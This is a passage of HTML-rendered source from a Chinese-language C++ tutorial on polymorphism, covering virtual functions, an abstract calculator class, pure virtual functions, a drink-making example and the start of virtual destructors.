<span class="hljs-string">&quot;st.Tuo::m_Age = &quot;</span> &lt;&lt;  st.Tuo::m_Age &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;st.m_Age = &quot;</span> &lt;&lt; st.m_Age &lt;&lt; endl;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-built_in">test01</span>();<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>总结：</p><ul><li>菱形继承带来的主要问题是子类继承两份相同的数据，导致资源浪费以及毫无意义</li><li>利用虚继承可以解决菱形继承问题</li></ul><h3 id="4-7-多态"><a href="#4-7-多态" class="headerlink" title="4.7  多态"></a>4.7  多态</h3><h4 id="4-7-1-多态的基本概念"><a href="#4-7-1-多态的基本概念" class="headerlink" title="4.7.1 多态的基本概念"></a>4.7.1 多态的基本概念</h4><p><strong>多态是C++面向对象三大特性之一</strong></p><p>多态分为两类</p><ul><li>静态多态: 函数重载 和 运算符重载属于静态多态，复用函数名</li><li>动态多态: 派生类和虚函数实现运行时多态</li></ul><p>静态多态和动态多态区别：</p><ul><li>静态多态的函数地址早绑定  -  编译阶段确定函数地址</li><li>动态多态的函数地址晚绑定  -  运行阶段确定函数地址</li></ul><p>下面通过案例进行讲解多态</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-comment">//Speak函数就是虚函数</span><br><span class="hljs-comment">//函数前面加上virtual关键字，变成虚函数，那么编译器在编译的时候就不能确定函数调用了。</span><br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">speak</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;动物在说话&quot;</span> &lt;&lt; endl;<br>&#125;<br>&#125;;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span> :<span class="hljs-keyword">public</span> Animal<br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">speak</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;小猫在说话&quot;</span> &lt;&lt; endl;<br>&#125;<br>&#125;;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> :<span class="hljs-keyword">public</span> Animal<br>&#123;<br><span class="hljs-keyword">public</span>:<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">speak</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;小狗在说话&quot;</span> &lt;&lt; endl;<br>&#125;<br><br>&#125;;<br><span class="hljs-comment">//我们希望传入什么对象，那么就调用什么对象的函数</span><br><span class="hljs-comment">//如果函数地址在编译阶段就能确定，那么静态联编</span><br><span class="hljs-comment">//如果函数地址在运行阶段才能确定，就是动态联编</span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">DoSpeak</span><span class="hljs-params">(Animal &amp; animal)</span></span><br><span class="hljs-function"></span>&#123;<br>animal.<span class="hljs-built_in">speak</span>();<br>&#125;<br><span class="hljs-comment">//</span><br><span class="hljs-comment">//多态满足条件： </span><br><span class="hljs-comment">//1、有继承关系</span><br><span class="hljs-comment">//2、子类重写父类中的虚函数</span><br><span class="hljs-comment">//多态使用：</span><br><span class="hljs-comment">//父类指针或引用指向子类对象</span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>Cat cat;<br><span class="hljs-built_in">DoSpeak</span>(cat);<br><br><br>Dog dog;<br><span class="hljs-built_in">DoSpeak</span>(dog);<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-built_in">test01</span>();<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>总结：</p><p>多态满足条件</p><ul><li>有继承关系</li><li>子类重写父类中的虚函数</li></ul><p>多态使用条件</p><ul><li>父类指针或引用指向子类对象</li></ul><p>重写：函数返回值类型  函数名 参数列表 完全一致称为重写</p><h4 id="4-7-2-多态案例一-计算器类"><a href="#4-7-2-多态案例一-计算器类" class="headerlink" title="4.7.2 多态案例一-计算器类"></a>4.7.2 多态案例一-计算器类</h4><p>案例描述：</p><p>分别利用普通写法和多态技术，设计实现两个操作数进行运算的计算器类</p><p>多态的优点：</p><ul><li>代码组织结构清晰</li><li>可读性强</li><li>利于前期和后期的扩展以及维护</li></ul><p><strong>示例：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">//普通实现</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Calculator</span> &#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">getResult</span><span class="hljs-params">(string oper)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (oper == <span class="hljs-string">&quot;+&quot;</span>) &#123;<br><span class="hljs-keyword">return</span> m_Num1 + m_Num2;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (oper == <span class="hljs-string">&quot;-&quot;</span>) &#123;<br><span class="hljs-keyword">return</span> m_Num1 - m_Num2;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (oper == <span class="hljs-string">&quot;*&quot;</span>) &#123;<br><span class="hljs-keyword">return</span> m_Num1 * m_Num2;<br>&#125;<br><span class="hljs-comment">//如果要提供新的运算，需要修改源码</span><br>&#125;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-type">int</span> m_Num1;<br><span class="hljs-type">int</span> m_Num2;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//普通实现测试</span><br>Calculator c;<br>c.m_Num1 = <span class="hljs-number">10</span>;<br>c.m_Num2 = <span class="hljs-number">10</span>;<br>cout &lt;&lt; c.m_Num1 &lt;&lt; <span class="hljs-string">&quot; + &quot;</span> &lt;&lt; c.m_Num2 &lt;&lt; <span class="hljs-string">&quot; = &quot;</span> &lt;&lt; c.<span class="hljs-built_in">getResult</span>(<span class="hljs-string">&quot;+&quot;</span>) &lt;&lt; endl;<br><br>cout &lt;&lt; c.m_Num1 &lt;&lt; <span class="hljs-string">&quot; - &quot;</span> &lt;&lt; c.m_Num2 &lt;&lt; <span class="hljs-string">&quot; = &quot;</span> &lt;&lt; c.<span class="hljs-built_in">getResult</span>(<span class="hljs-string">&quot;-&quot;</span>) &lt;&lt; endl;<br><br>cout &lt;&lt; c.m_Num1 &lt;&lt; <span class="hljs-string">&quot; * &quot;</span> &lt;&lt; c.m_Num2 &lt;&lt; <span class="hljs-string">&quot; = &quot;</span> &lt;&lt; c.<span class="hljs-built_in">getResult</span>(<span class="hljs-string">&quot;*&quot;</span>) &lt;&lt; endl;<br>&#125;<br><br><span class="hljs-comment">//多态实现</span><br><span class="hljs-comment">//抽象计算器类</span><br><span class="hljs-comment">//多态优点：代码组织结构清晰，可读性强，利于前期和后期的扩展以及维护</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AbstractCalculator</span><br>&#123;<br><span class="hljs-keyword">public</span> :<br><br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">int</span> <span class="hljs-title">getResult</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> m_Num1;<br><span class="hljs-type">int</span> m_Num2;<br>&#125;;<br><br><span class="hljs-comment">//加法计算器</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AddCalculator</span> :<span class="hljs-keyword">public</span> AbstractCalculator<br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">getResult</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> m_Num1 + m_Num2;<br>&#125;<br>&#125;;<br><br><span class="hljs-comment">//减法计算器</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SubCalculator</span> :<span class="hljs-keyword">public</span> AbstractCalculator<br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">getResult</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> m_Num1 - m_Num2;<br>&#125;<br>&#125;;<br><br><span class="hljs-comment">//乘法计算器</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MulCalculator</span> :<span class="hljs-keyword">public</span> AbstractCalculator<br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">getResult</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> m_Num1 * m_Num2;<br>&#125;<br>&#125;;<br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test02</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//创建加法计算器</span><br>AbstractCalculator *abc = <span class="hljs-keyword">new</span> AddCalculator;<br>abc-&gt;m_Num1 = <span class="hljs-number">10</span>;<br>abc-&gt;m_Num2 = <span class="hljs-number">10</span>;<br>cout &lt;&lt; abc-&gt;m_Num1 &lt;&lt; <span class="hljs-string">&quot; + &quot;</span> &lt;&lt; abc-&gt;m_Num2 &lt;&lt; <span class="hljs-string">&quot; = &quot;</span> &lt;&lt; abc-&gt;<span class="hljs-built_in">getResult</span>() &lt;&lt; endl;<br><span class="hljs-keyword">delete</span> abc;  <span class="hljs-comment">//用完了记得销毁</span><br><br><span class="hljs-comment">//创建减法计算器</span><br>abc = <span class="hljs-keyword">new</span> SubCalculator;<br>abc-&gt;m_Num1 = <span class="hljs-number">10</span>;<br>abc-&gt;m_Num2 = <span class="hljs-number">10</span>;<br>cout &lt;&lt; abc-&gt;m_Num1 &lt;&lt; <span class="hljs-string">&quot; - &quot;</span> &lt;&lt; abc-&gt;m_Num2 &lt;&lt; <span class="hljs-string">&quot; = &quot;</span> &lt;&lt; abc-&gt;<span class="hljs-built_in">getResult</span>() &lt;&lt; endl;<br><span class="hljs-keyword">delete</span> abc;  <br><br><span class="hljs-comment">//创建乘法计算器</span><br>abc = <span class="hljs-keyword">new</span> MulCalculator;<br>abc-&gt;m_Num1 = <span class="hljs-number">10</span>;<br>abc-&gt;m_Num2 = <span class="hljs-number">10</span>;<br>cout &lt;&lt; abc-&gt;m_Num1 &lt;&lt; <span class="hljs-string">&quot; * &quot;</span> &lt;&lt; abc-&gt;m_Num2 &lt;&lt; <span class="hljs-string">&quot; = &quot;</span> &lt;&lt; abc-&gt;<span class="hljs-built_in">getResult</span>() &lt;&lt; endl;<br><span class="hljs-keyword">delete</span> abc;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-comment">//test01();</span><br><br><span class="hljs-built_in">test02</span>();<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>总结：C++开发提倡利用多态设计程序架构，因为多态优点很多</p></blockquote><h4 id="4-7-3-纯虚函数和抽象类"><a href="#4-7-3-纯虚函数和抽象类" class="headerlink" title="4.7.3 纯虚函数和抽象类"></a>4.7.3 纯虚函数和抽象类</h4><p>在多态中，通常父类中虚函数的实现是毫无意义的，主要都是调用子类重写的内容</p><p>因此可以将虚函数改为<strong>纯虚函数</strong></p><p>纯虚函数语法：<code>virtual 返回值类型 函数名 （参数列表）= 0 ;</code></p><p>当类中有了纯虚函数，这个类也称为<strong>抽象类</strong></p><p><strong>抽象类特点</strong>：</p><ul><li>无法实例化对象</li><li>子类必须重写抽象类中的纯虚函数，否则也属于抽象类</li></ul><p><strong>示例：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Base</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-comment">//纯虚函数</span><br><span class="hljs-comment">//类中只要有一个纯虚函数就称为抽象类</span><br><span class="hljs-comment">//抽象类无法实例化对象</span><br><span class="hljs-comment">//子类必须重写父类中的纯虚函数，否则也属于抽象类</span><br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;<br>&#125;;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Son</span> :<span class="hljs-keyword">public</span> Base<br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">()</span> </span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;func调用&quot;</span> &lt;&lt; endl;<br>&#125;;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>Base * base = <span class="hljs-literal">NULL</span>;<br><span class="hljs-comment">//base = new Base; // 错误，抽象类无法实例化对象</span><br>base = <span class="hljs-keyword">new</span> Son;<br>base-&gt;<span class="hljs-built_in">func</span>();<br><span class="hljs-keyword">delete</span> base;<span class="hljs-comment">//记得销毁</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-built_in">test01</span>();<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="4-7-4-多态案例二-制作饮品"><a href="#4-7-4-多态案例二-制作饮品" class="headerlink" title="4.7.4 多态案例二-制作饮品"></a>4.7.4 多态案例二-制作饮品</h4><p><strong>案例描述：</strong></p><p>制作饮品的大致流程为：煮水 -  冲泡 - 倒入杯中 - 加入辅料</p><p>利用多态技术实现本案例，提供抽象制作饮品基类，提供子类制作咖啡和茶叶</p><p><strong>示例：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">//抽象制作饮品</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AbstractDrinking</span> &#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-comment">//烧水</span><br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">Boil</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;<br><span class="hljs-comment">//冲泡</span><br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">Brew</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;<br><span class="hljs-comment">//倒入杯中</span><br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">PourInCup</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;<br><span class="hljs-comment">//加入辅料</span><br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">PutSomething</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;<br><span class="hljs-comment">//规定流程</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">MakeDrink</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-built_in">Boil</span>();<br><span class="hljs-built_in">Brew</span>();<br><span class="hljs-built_in">PourInCup</span>();<br><span class="hljs-built_in">PutSomething</span>();<br>&#125;<br>&#125;;<br><br><span class="hljs-comment">//制作咖啡</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Coffee</span> : <span class="hljs-keyword">public</span> AbstractDrinking &#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-comment">//烧水</span><br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">Boil</span><span class="hljs-params">()</span> </span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;煮农夫山泉!&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-comment">//冲泡</span><br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">Brew</span><span class="hljs-params">()</span> </span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;冲泡咖啡!&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-comment">//倒入杯中</span><br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">PourInCup</span><span class="hljs-params">()</span> </span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;将咖啡倒入杯中!&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-comment">//加入辅料</span><br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">PutSomething</span><span class="hljs-params">()</span> </span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;加入牛奶!&quot;</span> &lt;&lt; endl;<br>&#125;<br>&#125;;<br><br><span class="hljs-comment">//制作茶水</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Tea</span> : <span class="hljs-keyword">public</span> AbstractDrinking &#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-comment">//烧水</span><br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">Boil</span><span class="hljs-params">()</span> </span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;煮自来水!&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-comment">//冲泡</span><br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">Brew</span><span class="hljs-params">()</span> </span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;冲泡茶叶!&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-comment">//倒入杯中</span><br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">PourInCup</span><span class="hljs-params">()</span> </span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;将茶水倒入杯中!&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-comment">//加入辅料</span><br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">PutSomething</span><span class="hljs-params">()</span> </span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;加入枸杞!&quot;</span> &lt;&lt; endl;<br>&#125;<br>&#125;;<br><br><span class="hljs-comment">//业务函数</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">DoWork</span><span class="hljs-params">(AbstractDrinking* drink)</span> </span>&#123;<br>drink-&gt;<span class="hljs-built_in">MakeDrink</span>();<br><span class="hljs-keyword">delete</span> drink;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-built_in">DoWork</span>(<span class="hljs-keyword">new</span> Coffee);<br>cout &lt;&lt; <span class="hljs-string">&quot;--------------&quot;</span> &lt;&lt; endl;<br><span class="hljs-built_in">DoWork</span>(<span class="hljs-keyword">new</span> Tea);<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-built_in">test01</span>();<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="4-7-5-虚析构和纯虚析构"><a href="#4-7-5-虚析构和纯虚析构" class="headerlink" title="4.7.5 虚析构和纯虚析构"></a>4.7.5 虚析构和纯虚析构</h4><p>多态使用时，如果子类中有属性开辟到堆区，那么父类指针在释放时无法调用到子类的析构代码</p><p>解决方式：将父类中的析构函数改为<strong>虚析构</strong>或者<strong>纯虚析构</strong></p><p>虚析构和纯虚析构共性：</p><ul><li>可以解决父类指针释放子类对象</li><li>都需要有具体的函数实现</li></ul><p>虚析构和纯虚析构区别：</p><ul><li>如果是纯虚析构，该类属于抽象类，无法实例化对象</li></ul><p>虚析构语法：</p><p><code>virtual ~类名()&#123;&#125;</code></p><p>纯虚析构语法：</p><p><code> virtual ~类名() = 0;</code></p><p><code>类名::~类名()&#123;&#125;</code></p><p><strong>示例：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span 